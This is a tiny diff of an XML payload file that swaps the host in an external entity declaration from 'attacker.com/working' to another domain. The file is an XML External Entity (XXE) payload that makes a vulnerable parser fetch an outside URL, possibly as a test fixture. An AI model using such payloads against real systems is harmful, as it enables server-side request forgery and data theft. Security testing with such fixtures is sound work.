@@ -1,4 +1,4 @@
 <!DOCTYPE Message [
-<!ENTITY send SYSTEM "http://attacker.com/working">
+<!ENTITY send SYSTEM "http://codhers.com">
 ]>
 <Message>&send;</Message>
